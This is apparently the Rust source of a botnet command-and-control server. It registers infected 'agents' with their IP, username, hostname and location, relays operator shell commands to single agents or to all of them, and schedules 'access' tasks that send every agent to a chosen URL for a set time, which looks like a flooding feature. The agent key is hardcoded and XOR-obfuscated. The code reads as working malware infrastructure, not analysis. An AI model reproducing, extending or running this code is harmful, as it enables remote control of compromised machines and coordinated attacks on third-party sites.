use crate::handlers::models::{Agent, C2Message, ScheduledTask};
use base64;
use chacha20poly1305::{
    AeadCore, XChaCha20Poly1305, XNonce,
    aead::{Aead, KeyInit, OsRng},
};
use chrono::{DateTime, Utc};
use futures::{SinkExt, StreamExt};
use serde_json::json;
use sqlx::{Pool, Postgres, Row};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::sync::mpsc;
use tokio::time;
use uuid::Uuid;
use warp::Filter;
use warp::ws::{Message, WebSocket};

const XOR_KEY: [u8; 32] = [
    0x89, 0x45, 0x23, 0xAB, 0xCD, 0xEF, 0x67, 0x89,
    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
    0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00
];

const ENCRYPTED_AGENT_KEY: &str = "2mhkUVtYZnFBZ1JwWFJzZEdWamRYSmxaR3RsZVRFeU16UTFOZz09";

fn xor_decrypt_key(encrypted_key: &[u8]) -> [u8; 32] {
    let mut decrypted = [0u8; 32];
    for (i, &byte) in encrypted_key.iter().take(32).enumerate() {
        decrypted[i] = byte ^ XOR_KEY[i];
    }
    decrypted
}

pub struct ServerState {
    pub agents: HashMap<String, mpsc::Sender<Message>>,
    pub clients: HashMap<String, mpsc::Sender<Message>>,
    pub db: Pool<Postgres>,
    pub server_key: [u8; 32],
    pub operator_keys: HashMap<String, [u8; 32]>,
    pub agent_uuid_map: HashMap<String, String>,
}

impl ServerState {
    pub fn new(db: Pool<Postgres>) -> Self {
        let server_key = XChaCha20Poly1305::generate_key(&mut OsRng).into();
        ServerState {
            agents: HashMap::new(),
            clients: HashMap::new(),
            db,
            server_key,
            operator_keys: HashMap::new(),
            agent_uuid_map: HashMap::new(),
        }
    }
}

pub async fn start_server(db: Pool<Postgres>) {
    let state = Arc::new(Mutex::new(ServerState::new(db.clone())));
    let state_clone = Arc::clone(&state);
    let state_clone2 = Arc::clone(&state);
    let state_clone3 = Arc::clone(&state);
    let state_filter = warp::any().map(move || Arc::clone(&state_clone));

    // Load operator public keys and agent key
    {
        let db = db.clone();
        let mut state = state.lock().unwrap();
        let encrypted_key = base64::decode(ENCRYPTED_AGENT_KEY)
            .expect("Failed to decode encrypted agent key");
        let agent_key = xor_decrypt_key(&encrypted_key);
        state.operator_keys.insert("agent".to_string(), agent_key);

        let rows =
            sqlx::query("SELECT operator_id, public_key FROM operator_tokens WHERE active = true")
                .fetch_all(&db)
                .await
                .unwrap_or_default();
        for row in rows {
            let operator_id: String = row.get("operator_id");
            let public_key: Vec<u8> = row.get("public_key");
            if public_key.len() == 32 {
                let mut key = [0u8; 32];
                key.copy_from_slice(&public_key);
                state.operator_keys.insert(operator_id.clone(), key);
                eprintln!("Loaded operator key for {}", operator_id);
            }
        }
    }

    // Background worker for scheduled tasks
    {
        tokio::spawn(async move {
            let mut interval = time::interval(Duration::from_secs(1));
            loop {
                interval.tick().await;
                let now = Utc::now();
                let db = state_clone2.lock().unwrap().db.clone();
                let tasks = sqlx::query_as::<_, ScheduledTask>(
                    "SELECT id, command_type, args, execute_at, executed FROM scheduled_tasks WHERE execute_at <= $1 AND executed = false"
                )
                .bind(now)
                .fetch_all(&db)
                .await;
                match tasks {
                    Ok(tasks) => {
                        if !tasks.is_empty() {
                            eprintln!("Found {} scheduled tasks to execute", tasks.len());
                        }
                        for task in tasks {
                            let task_id = task.id;
                            match task.command_type.as_str() {
                                "broadcast" => {
                                    if let Some(cmd) = task.args["cmd"].as_str() {
                                        let senders = state_clone2
                                            .lock()
                                            .unwrap()
                                            .agents
                                            .values()
                                            .cloned()
                                            .collect::<Vec<_>>();
                                        let msg = serde_json::to_string(&C2Message::Broadcast {
                                            cmd: cmd.to_string(),
                                        })
                                        .unwrap();
                                        let encrypted =
                                            encrypt_message(&state_clone2, "agent", &msg)
                                                .await
                                                .unwrap();
                                        eprintln!(
                                            "Broadcasting task {} to {} agents",
                                            task_id,
                                            senders.len()
                                        );
                                        for sender in senders {
                                            if let Err(e) = sender
                                                .send(Message::binary(encrypted.clone()))
                                                .await
                                            {
                                                eprintln!(
                                                    "Failed to send broadcast task {}: {}",
                                                    task_id, e
                                                );
                                            }
                                        }
                                    }
                                }
                                "access" => {
                                    if let (Some(url), Some(secs)) = (
                                        task.args["url"].as_str(),
                                        task.args["duration_secs"].as_u64(),
                                    ) {
                                        let access_cmd = json!({
                                            "action": "access",
                                            "url": url,
                                            "duration_secs": secs
                                        })
                                        .to_string();
                                        let msg = serde_json::to_string(&C2Message::Broadcast {
                                            cmd: access_cmd,
                                        })
                                        .unwrap();
                                        let encrypted =
                                            encrypt_message(&state_clone2, "agent", &msg)
                                                .await
                                                .unwrap();
                                        let senders = state_clone2
                                            .lock()
                                            .unwrap()
                                            .agents
                                            .values()
                                            .cloned()
                                            .collect::<Vec<_>>();
                                        eprintln!(
                                            "Broadcasting access task {} to {} agents",
                                            task_id,
                                            senders.len()
                                        );
                                        for sender in senders {
                                            if let Err(e) = sender
                                                .send(Message::binary(encrypted.clone()))
                                                .await
                                            {
                                                eprintln!(
                                                    "Failed to send access task {}: {}",
                                                    task_id, e
                                                );
                                            }
                                        }
                                    }
                                }
                                _ => eprintln!(
                                    "Unknown task type for task {}: {}",
                                    task_id, task.command_type
                                ),
                            }

                            sqlx::query("UPDATE scheduled_tasks SET executed = true WHERE id = $1")
                                .bind(task_id)
                                .execute(&db)
                                .await
                                .map_err(|e| {
                                    eprintln!("Failed to mark task {} as executed: {}", task_id, e)
                                })
                                .ok();

                            eprintln!("Task {} marked as executed", task_id);
                        }
                    }
                    Err(e) => eprintln!("Failed to fetch scheduled tasks: {}", e),
                }
            }
        });
    }

    // Background worker for agent ping
    {
        tokio::spawn(async move {
            let mut interval = time::interval(Duration::from_secs(30)); // Ping every 30 seconds
            loop {
                interval.tick().await;
                let senders = state_clone3.lock().unwrap().agents.clone();
                
                for (uuid, sender) in senders {
                    let ping_msg = serde_json::to_string(&C2Message::Ping).unwrap();
                    match encrypt_message(&state_clone3, "agent", &ping_msg).await {
                        Ok(encrypted) => {
                            if let Err(e) = sender.send(Message::binary(encrypted)).await {
                                eprintln!("Failed to send ping to agent {}: {}", uuid, e);
                                // If we can't send ping, mark agent as offline
                                if let Err(e) = update_agent_status(&state_clone3, &uuid, false).await {
                                    eprintln!("Failed to update agent {} status: {}", uuid, e);
                                }
                            }
                        }
                        Err(e) => eprintln!("Failed to encrypt ping message for agent {}: {}", uuid, e),
                    }
                }
            }
        });
    }

    let ws_route = warp::path("c2").and(warp::ws()).and(state_filter).map(
        |ws: warp::ws::Ws, state: Arc<Mutex<ServerState>>| {
            ws.on_upgrade(move |socket| handle_connection(socket, state))
        },
    );
    eprintln!("Server started on ws://0.0.0.0:80/c2");
    warp::serve(ws_route).run(([0, 0, 0, 0], 80)).await;
}

async fn validate_token(
    db: &Pool<Postgres>,
    operator_id: &str,
    token: &str,
) -> Result<bool, sqlx::Error> {
    let result = sqlx::query("SELECT active FROM operator_tokens WHERE operator_id = $1 AND token = $2 AND (expires_at IS NULL OR expires_at > CURRENT_TIMESTAMP)")
        .bind(operator_id)
        .bind(token)
        .fetch_optional(db)
        .await?;
    let is_valid = result
        .map(|row| row.get::<bool, _>("active"))
        .unwrap_or(false);
    if !is_valid {
        eprintln!("Invalid token for operator_id: {}", operator_id);
    }
    Ok(is_valid)
}

async fn update_agent_status(
    state: &Arc<Mutex<ServerState>>,
    uuid: &str,
    online: bool,
) -> Result<(), sqlx::Error> {
    let db = state.lock().unwrap().db.clone();
    let now = Utc::now();
    
    sqlx::query(
        "UPDATE agents SET 
            online = $1,
            last_seen = CASE WHEN $1 = true THEN $2 ELSE last_seen END
        WHERE uuid = $3"
    )
    .bind(online)
    .bind(now)
    .bind(uuid)
    .execute(&db)
    .await?;

    eprintln!("Updated agent {} status to online={}", uuid, online);
    Ok(())
}

async fn encrypt_message(
    state: &Arc<Mutex<ServerState>>,
    id: &str,
    message: &str,
) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    let state = state.lock().unwrap();
    let key = state
        .operator_keys
        .get(id)
        .ok_or(format!("Key not found for id: {}", id))?;
    let cipher = XChaCha20Poly1305::new(key.into());
    let nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);
    let ciphertext = cipher.encrypt(&nonce, message.as_bytes());
    let mut result = nonce.to_vec();
    result.extend_from_slice(&ciphertext.unwrap());
    Ok(result)
}

async fn decrypt_message(
    state: &Arc<Mutex<ServerState>>,
    id: &str,
    data: &[u8],
) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
    let state = state.lock().unwrap();
    let key = state
        .operator_keys
        .get(id)
        .ok_or(format!("Key not found for id: {}", id))?;
    if data.len() < 24 {
        return Err("Invalid message length".into());
    }
    let nonce = XNonce::from_slice(&data[..24]);
    let ciphertext = &data[24..];
    let cipher = XChaCha20Poly1305::new(key.into());
    let plaintext = cipher.decrypt(nonce, ciphertext).unwrap();
    Ok(String::from_utf8(plaintext)?)
}

async fn handle_connection(ws: WebSocket, state: Arc<Mutex<ServerState>>) {
    let connection_uuid = Uuid::new_v4().to_string();
    eprintln!("New WebSocket connection: {}", connection_uuid);
    let (mut ws_tx, mut ws_rx) = ws.split();
    let (tx, mut rx) = mpsc::channel::<Message>(100);
    {
        let mut state = state.lock().unwrap();
        state.clients.insert(connection_uuid.clone(), tx.clone());
    }

    tokio::spawn(async move {
        while let Some(msg) = rx.recv().await {
            let _ = ws_tx.send(msg).await;
        }
    });

    let mut authenticated = false;
    let mut operator_id = String::new();
    let mut is_agent = false;
    let mut operator_token = String::new();

    while let Some(result) = ws_rx.next().await {
        let msg = match result {
            Ok(msg) => msg,
            Err(e) => {
                eprintln!("WebSocket error for connection {}: {}", connection_uuid, e);
                break;
            }
        };

        let text = if let Ok(text) = msg.to_str() {
            text.to_string()
        } else if msg.is_binary() {
            let data = msg.into_bytes();
            if data.len() < 24 {
                eprintln!(
                    "Invalid binary message length for connection {}",
                    connection_uuid
                );
                continue;
            }
            let id = if authenticated { &operator_id } else { "agent" };
            match decrypt_message(&state, id, &data).await {
                Ok(text) => {
                    if !authenticated && id == "agent" {
                        is_agent = true;
                    }
                    text
                }
                Err(e) => {
                    eprintln!(
                        "Decryption failed for connection {}: {}",
                        connection_uuid, e
                    );
                    continue;
                }
            }
        } else {
            eprintln!(
                "Received non-text/binary message for connection {}",
                connection_uuid
            );
            continue;
        };

        let c2_msg: C2Message = match serde_json::from_str(&text) {
            Ok(msg) => msg,
            Err(e) => {
                eprintln!(
                    "Invalid C2Message for connection {}: {}",
                    connection_uuid, e
                );
                continue;
            }
        };

        if authenticated && !is_agent {
            let db = state.lock().unwrap().db.clone();
            if !validate_token(&db, &operator_id, &operator_token)
                .await
                .unwrap_or_default()
            {
                let response = serde_json::to_string(&C2Message::AuthResponse {
                    success: false,
                    message: "Invalid or expired token".to_string(),
                })
                .unwrap();
                let encrypted = encrypt_message(&state, &operator_id, &response)
                    .await
                    .unwrap();
                let _ = tx.send(Message::binary(encrypted)).await;
                let _ = tx.send(Message::close()).await;
                eprintln!("Closed connection {} due to invalid token", connection_uuid);
                break;
            }
        }

        match c2_msg {
            C2Message::Authenticate {
                operator_id: op_id,
                token,
            } => {
                operator_id = op_id.clone();
                operator_token = token.clone();
                let db = state.lock().unwrap().db.clone();
                if validate_token(&db, &op_id, &token).await.unwrap_or(false) {
                    authenticated = true;
                    is_agent = false;
                    let response = serde_json::to_string(&C2Message::AuthResponse {
                        success: true,
                        message: "Authentication successful".to_string(),
                    })
                    .unwrap();
                    let encrypted = encrypt_message(&state, &op_id, &response).await.unwrap();
                    let _ = tx.send(Message::binary(encrypted)).await;
                    eprintln!("Operator {} authenticated successfully", op_id);
                } else {
                    let response = serde_json::to_string(&C2Message::AuthResponse {
                        success: false,
                        message: "Invalid or expired token".to_string(),
                    })
                    .unwrap();
                    let _ = tx.send(Message::text(response)).await;
                    let _ = tx.send(Message::close()).await;
                    eprintln!("Authentication failed for operator {}", op_id);
                }
            }
            C2Message::VersionCheck {
                uuid,
                agent_version,
            } => {
                if !is_agent {
                    continue;
                }
                let response = serde_json::to_string(&C2Message::VersionResponse {
                    version: "1.0.1".to_string(),
                })
                .unwrap();
                let encrypted = encrypt_message(&state, "agent", &response).await.unwrap();
                let _ = tx.send(Message::binary(encrypted)).await;
                eprintln!(
                    "Agent {} sent version check with version {}",
                    uuid, agent_version
                );
            }
            C2Message::VersionCheckAck {} => {
                if !is_agent {
                    continue;
                }
                eprintln!(
                    "Received version check ack from agent for connection {}",
                    connection_uuid
                );
            }
            C2Message::Pong => {
                if !is_agent {
                    continue;
                }
                let agent_uuid = state
                    .lock()
                    .unwrap()
                    .agent_uuid_map
                    .get(&connection_uuid)
                    .cloned()
                    .unwrap_or(connection_uuid.clone());
                update_agent_status(&state, &agent_uuid, true).await.ok();
                let response = serde_json::to_string(&C2Message::AgentStatus {
                    uuid: agent_uuid.clone(),
                    online: true,
                })
                .unwrap();
                let encrypted = encrypt_message(&state, "agent", &response).await.unwrap();
                let senders = state
                    .lock()
                    .unwrap()
                    .clients
                    .values()
                    .cloned()
                    .collect::<Vec<_>>();
                for sender in senders {
                    let _ = sender.send(Message::binary(encrypted.clone())).await;
                }
                eprintln!("Agent {} sent pong, status updated", agent_uuid);
            }
            C2Message::AgentRegister {
                uuid,
                ip,
                username,
                hostname,
                country,
                city,
                region,
                latitude,
                longitude,
                version,
            } => {
                if !is_agent {
                    continue;
                }
                let db = state.lock().unwrap().db.clone();
                sqlx::query(
                    "INSERT INTO agents (uuid, ip, username, hostname, country, city, region, latitude, longitude, version, last_seen, online) 
                    VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, CURRENT_TIMESTAMP, true) 
                    ON CONFLICT (uuid) DO UPDATE SET
                    ip = EXCLUDED.ip,
                    username = EXCLUDED.username,
                    hostname = EXCLUDED.hostname,
                    country = EXCLUDED.country,
                    city = EXCLUDED.city,
                    region = EXCLUDED.region,
                    latitude = EXCLUDED.latitude,
                    longitude = EXCLUDED.longitude,
                    version = EXCLUDED.version,
                    last_seen = CURRENT_TIMESTAMP,
                    online = true"
                )
                .bind(&uuid)
                .bind(&ip)
                .bind(&username)
                .bind(&hostname)
                .bind(&country)
                .bind(&city)
                .bind(region)
                .bind(latitude)
                .bind(longitude)
                .bind(&version)
                .execute(&db)
                .await
                .map_err(|e| {
                    eprintln!("Failed to register agent {}: {}", uuid, e);
                })
                .ok();

                let mut state = state.lock().unwrap();
                state.agents.insert(uuid.clone(), tx.clone());
                state
                    .agent_uuid_map
                    .insert(connection_uuid.clone(), uuid.clone());
                eprintln!("Agent {} registered with IP {}", uuid, ip);
            }
            C2Message::RequestAgentList => {
                if !authenticated {
                    continue;
                }
                let db = state.lock().unwrap().db.clone();
                let agents = sqlx::query_as::<_, Agent>("SELECT * FROM agents")
                    .fetch_all(&db)
                    .await
                    .unwrap_or_default();
                let response = serde_json::to_string(&C2Message::AgentList {
                    agents: agents.clone(),
                    total: agents.len(),
                    online: agents.iter().filter(|agent| agent.online).count(),
                })
                .unwrap();
                let encrypted = encrypt_message(&state, &operator_id, &response)
                    .await
                    .unwrap();
                let _ = tx.send(Message::binary(encrypted)).await;
                eprintln!("Sent agent list to operator {}", operator_id);
            }
            C2Message::RequestAgentDetails { identifier } => {
                if !authenticated {
                    continue;
                }
                let db = state.lock().unwrap().db.clone();
                let agent = if let Ok(id) = identifier.parse::<i32>() {
                    sqlx::query_as::<_, Agent>("SELECT * FROM agents WHERE id = $1")
                        .bind(id)
                        .fetch_optional(&db)
                        .await
                        .unwrap_or(None)
                } else {
                    sqlx::query_as::<_, Agent>("SELECT * FROM agents WHERE uuid = $1")
                        .bind(&identifier)
                        .fetch_optional(&db)
                        .await
                        .unwrap_or(None)
                };
                let response = serde_json::to_string(&C2Message::AgentDetails { agent }).unwrap();
                let encrypted = encrypt_message(&state, &operator_id, &response)
                    .await
                    .unwrap();
                let _ = tx.send(Message::binary(encrypted)).await;
                eprintln!(
                    "Sent agent details for {} to operator {}",
                    identifier, operator_id
                );
            }
            C2Message::RequestScheduledTasks { show_all } => {
                if !authenticated {
                    continue;
                }
                let db = state.lock().unwrap().db.clone();
                let query = if show_all {
                    "SELECT id, command_type, args, execute_at, executed FROM scheduled_tasks ORDER BY execute_at DESC"
                } else {
                    "SELECT id, command_type, args, execute_at, executed FROM scheduled_tasks WHERE executed = false ORDER BY execute_at ASC"
                };
                let tasks = sqlx::query_as::<_, ScheduledTask>(query)
                    .fetch_all(&db)
                    .await
                    .unwrap_or_default();
                let response = serde_json::to_string(&C2Message::ScheduledTasks { tasks }).unwrap();
                let encrypted = encrypt_message(&state, &operator_id, &response)
                    .await
                    .unwrap();
                let _ = tx.send(Message::binary(encrypted)).await;
                eprintln!("Sent scheduled tasks to operator {}", operator_id);
            }
            C2Message::CancelScheduledTask { task_id } => {
                if !authenticated {
                    continue;
                }
                let db = state.lock().unwrap().db.clone();
                
                // Primeiro verifica se a tarefa existe e não foi executada
                let task = sqlx::query_as::<_, ScheduledTask>(
                    "SELECT id, command_type, args, execute_at, executed FROM scheduled_tasks WHERE id = $1 AND executed = false"
                )
                .bind(task_id)
                .fetch_optional(&db)
                .await;

                let (success, message) = match task {
                    Ok(Some(_)) => {
                        // A tarefa existe e não foi executada, podemos cancelar
                        match sqlx::query("UPDATE scheduled_tasks SET executed = true WHERE id = $1 AND executed = false")
                            .bind(task_id)
                            .execute(&db)
                            .await
                        {
                            Ok(result) => {
                                if result.rows_affected() > 0 {
                                    eprintln!("Task {} cancelled by operator {}", task_id, operator_id);
                                    (true, format!("Task {} cancelled successfully", task_id))
                                } else {
                                    eprintln!("Task {} was already executed or cancelled", task_id);
                                    (false, format!("Task {} was already executed or cancelled", task_id))
                                }
                            }
                            Err(e) => {
                                eprintln!("Failed to cancel task {}: {}", task_id, e);
                                (false, format!("Failed to cancel task: {}", e))
                            }
                        }
                    }
                    Ok(None) => {
                        eprintln!("Task {} not found or already executed", task_id);
                        (false, format!("Task {} not found or already executed", task_id))
                    }
                    Err(e) => {
                        eprintln!("Error checking task {}: {}", task_id, e);
                        (false, format!("Database error: {}", e))
                    }
                };

                let response = serde_json::to_string(&C2Message::CancelTaskResponse { 
                    success, 
                    message 
                }).unwrap();
                let encrypted = encrypt_message(&state, &operator_id, &response)
                    .await
                    .unwrap();
                let _ = tx.send(Message::binary(encrypted)).await;
            }
            C2Message::Command { uuid, cmd } => {
                if !authenticated {
                    continue;
                }
                if uuid == "server" {
                    let parts: Vec<&str> = cmd.split(' ').collect();
                    if parts.len() >= 3 && parts[0] == "schedule" {
                        let subcommand = parts[1];
                        let time_str = parts[2];
                        let execute_at = if let Ok(secs) = time_str.parse::<i64>() {
                            // Se for um número, interpreta como segundos a partir de agora
                            Utc::now() + chrono::Duration::seconds(secs)
                        } else if let Ok(dt) = DateTime::parse_from_rfc3339(time_str) {
                            // Se for uma string RFC3339, usa diretamente
                            dt.with_timezone(&Utc)
                        } else {
                            eprintln!(
                                "Invalid time format '{}' for operator {}",
                                time_str, operator_id
                            );
                            // Envia mensagem de erro para o operador
                            let response = serde_json::to_string(&C2Message::CommandResponse {
                                output: format!("Invalid time format. Use either RFC3339 (e.g. 2024-03-21T15:30:00Z) or number of seconds from now"),
                            }).unwrap();
                            let encrypted = encrypt_message(&state, &operator_id, &response).await.unwrap();
                            tx.send(Message::binary(encrypted)).await;
                            continue;
                        };

                        let args_json: serde_json::Value = match subcommand {
                            "broadcast" => {
                                let cmd = parts[3..].join(" ").trim_matches('"').to_string();
                                json!({
                                    "cmd": cmd
                                })
                            }
                            "access" => {
                                if parts.len() >= 5 {
                                    let url = parts[3];
                                    if let Ok(secs) = parts[4].parse::<u64>() {
                                        json!({
                                            "url": url,
                                            "duration_secs": secs
                                        })
                                    } else {
                                        eprintln!("Invalid duration_secs: {}. Usage: schedule <time> access <url> <duration_secs>", parts[4]);
                                        let response = serde_json::to_string(&C2Message::CommandResponse {
                                            output: format!("Invalid duration_secs: {}. Must be a positive number.", parts[4]),
                                        }).unwrap();
                                        let encrypted = encrypt_message(&state, &operator_id, &response).await.unwrap();
                                        tx.send(Message::binary(encrypted)).await;
                                        continue;
                                    }
                                } else {
                                    eprintln!("Invalid access args. Usage: schedule <time> access <url> <duration_secs>");
                                    let response = serde_json::to_string(&C2Message::CommandResponse {
                                        output: "Invalid access args. Usage: schedule <time> access <url> <duration_secs>".to_string(),
                                    }).unwrap();
                                    let encrypted = encrypt_message(&state, &operator_id, &response).await.unwrap();
                                    tx.send(Message::binary(encrypted)).await;
                                    continue;
                                }
                            }
                            _ => {
                                eprintln!("Unknown command type: {}. Available types: broadcast, access", subcommand);
                                let response = serde_json::to_string(&C2Message::CommandResponse {
                                    output: format!("Unknown command type: {}. Available types: broadcast, access", subcommand),
                                }).unwrap();
                                let encrypted = encrypt_message(&state, &operator_id, &response).await.unwrap();
                                tx.send(Message::binary(encrypted)).await;
                                continue;
                            }
                        };

                        let db = state.lock().unwrap().db.clone();
                        let result = sqlx::query(
                            "INSERT INTO scheduled_tasks (command_type, args, execute_at) VALUES ($1, $2, $3)"
                        )
                        .bind(subcommand)
                        .bind(&args_json)
                        .bind(execute_at)
                        .execute(&db)
                        .await;

                        match result {
                            Ok(_) => {
                                eprintln!(
                                    "Scheduled task {} at {} for operator {} with args: {}",
                                    subcommand, execute_at, operator_id, args_json
                                );
                                let response = serde_json::to_string(&C2Message::CommandResponse {
                                    output: format!("Task scheduled successfully for {}", execute_at),
                                }).unwrap();
                                let encrypted = encrypt_message(&state, &operator_id, &response).await.unwrap();
                                let _ = tx.send(Message::binary(encrypted)).await;
                            },
                            Err(e) => {
                                eprintln!(
                                    "Failed to schedule task for operator {}: {}",
                                    operator_id, e
                                );
                                let response = serde_json::to_string(&C2Message::CommandResponse {
                                    output: format!("Failed to schedule task: {}", e),
                                }).unwrap();
                                let encrypted = encrypt_message(&state, &operator_id, &response).await.unwrap();
                                tx.send(Message::binary(encrypted)).await;
                            },
                        }
                    }
                } else {
                    let agent_sender = {
                        let state = state.lock().unwrap();
                        state.agents.get(&uuid).cloned()
                    };
                    if let Some(agent_sender) = agent_sender {
                        let command_msg = serde_json::to_string(&C2Message::Command {
                            uuid: uuid.clone(),
                            cmd: cmd.clone(),
                        })
                        .unwrap();
                        let encrypted = encrypt_message(&state, "agent", &command_msg).await;
                        match encrypted {
                            Ok(enc) => {
                                let _ = agent_sender.send(Message::binary(enc)).await;
                                eprintln!(
                                    "Sent command '{}' to agent {} from operator {}",
                                    cmd, uuid, operator_id
                                );
                            }
                            Err(e) => {
                                eprintln!("Encryption error for command to agent {}: {}", uuid, e)
                            }
                        }
                    } else {
                        eprintln!(
                            "Agent {} not found for command from operator {}",
                            uuid, operator_id
                        );
                    }
                }
            }
            C2Message::Broadcast { cmd } => {
                if !authenticated {
                    continue;
                }
                let senders = state
                    .lock()
                    .unwrap()
                    .agents
                    .values()
                    .cloned()
                    .collect::<Vec<_>>();
                let broadcast_msg =
                    serde_json::to_string(&C2Message::Broadcast { cmd: cmd.clone() }).unwrap();
                let encrypted = encrypt_message(&state, "agent", &broadcast_msg)
                    .await
                    .unwrap();
                for sender in senders.clone() {
                    let _ = sender.send(Message::binary(encrypted.clone())).await;
                }
                eprintln!(
                    "Broadcasted command '{}' to {} agents from operator {}",
                    cmd,
                    senders.len(),
                    operator_id
                );
            }
            C2Message::CommandResponse { output } => {
                if !is_agent {
                    continue;
                }
                let agent_uuid = state
                    .lock()
                    .unwrap()
                    .agent_uuid_map
                    .get(&connection_uuid)
                    .cloned()
                    .unwrap_or(connection_uuid.clone());
                let senders = state
                    .lock()
                    .unwrap()
                    .clients
                    .values()
                    .cloned()
                    .collect::<Vec<_>>();
                let response_msg = serde_json::to_string(&C2Message::CommandResponse {
                    output: output.clone(),
                })
                .unwrap();
                let encrypted = encrypt_message(&state, "agent", &response_msg)
                    .await
                    .unwrap();
                for sender in senders {
                    if let Err(e) = sender.send(Message::binary(encrypted.clone())).await {
                        eprintln!(
                            "Failed to send command response from agent {}: {}",
                            agent_uuid, e
                        );
                    }
                }
                eprintln!(
                    "Received command response from agent {} for operator {}",
                    agent_uuid, operator_id
                );
            }
            _ => {}
        }
    }

    let agent_uuid = {
        let mut state = state.lock().unwrap();
        state.clients.remove(&connection_uuid);
        state.agent_uuid_map.remove(&connection_uuid).map(|uuid| {
            state.agents.remove(&uuid);
            uuid
        })
    };
    if let Some(agent_uuid) = agent_uuid {
        update_agent_status(&state, &agent_uuid, false).await.ok();
        eprintln!("Agent {} disconnected", agent_uuid);
    }
    eprintln!("WebSocket connection {} closed", connection_uuid);
}
